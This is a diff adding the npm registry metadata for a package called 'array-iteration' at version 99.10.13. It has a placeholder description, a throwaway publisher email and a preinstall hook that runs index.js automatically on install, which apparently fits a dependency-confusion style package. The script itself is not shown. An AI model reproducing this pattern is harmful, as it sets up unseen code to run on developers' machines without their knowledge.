@@ -1,0 +1,39 @@
+{
+    "name": "array-iteration",
+    "version": "99.10.13",
+    "description": "rukkaz package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "array-iteration@99.10.13",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-1sRdZrmqFI8c4PdIPRiEKpyZxpytKLAIKhEqeiGtr9Iyix60aHUPwXcmXxHZ/vWyWFGhigiKoLTqRhlqXidrRw==",
+        "shasum": "256e8682c7149bd773e1f16d741a928296c9652f",
+        "tarball": "https://registry.npmjs.org/array-iteration/-/array-iteration-99.10.13.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5073,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQOXTACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmppNQ/5AGnSRpOUO18AQXpQ6+0Ie+nS6AdxYPjjnfMuWTO6xa9R3yz3\r\n34lBz15f4LyIukgwiFEFxPZhxS1gS6v4sI1xFMYCU+xqm1zZVpYSXB0f1iX/\r\nwHqXX/Omnyf+6pk3kXrLwoNjpKirgRlE+E0DPZ9QRSBUzFgVwKzTht0Ukn4o\r\ncR0K9wfTWxmxDJ/FFlaKRnLB3/vXioNQvREdAsmInKB5Y+R57xv/toqA7rvc\r\nrlGOB4C/gD22Qw2oXJFN7u67BgIa8FrGZ7KKoU/svXyHf8+5U1T7YxgXGL+M\r\nKvwVGXIw1EI22msWcBmQ66UB0F7k2i/YDp6GO04VgNE9CBwfMocwJ3RvZyL/\r\nXL+hp5RLgDMf1IAb1+9QNeobsW9efq9wvaIAW4PvdYRLSZ+GirKXCMhCql2x\r\nBrlaLtih4AFtVMuWLQn5ZcaNLOeaggQkKYbYKqpYz03KyMqdz+TuOyN76UbN\r\nk+k9BrTRBnWjWz1ULT67QohOai/V1LR1jNakVYD2EMS0wIbRn3QvbIpY02u1\r\nbhfpnDwwz98j14eOoki16gP8awcC7FV0tlaeY38eF2htHHYeaEFy06YoMNq6\r\nxHEg4AT1pnQW7j1kZJpQi7dFR8QU0iLRRVkDdW8ugjhGordLWbg9QCaYsMI7\r\na2XFlIoYQbMK1nhLy7XOoQyOJ9HIxDcrgno=\r\n=gqp9\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "mtao4d2v",
+        "email": "mtao4d2v@33mail.ga"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "mtao4d2v",
+            "email": "mtao4d2v@33mail.ga"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/array-iteration_99.10.13_1648420306939_0.02473136911397522"
+    },
+    "_hasShrinkwrap": false
+}
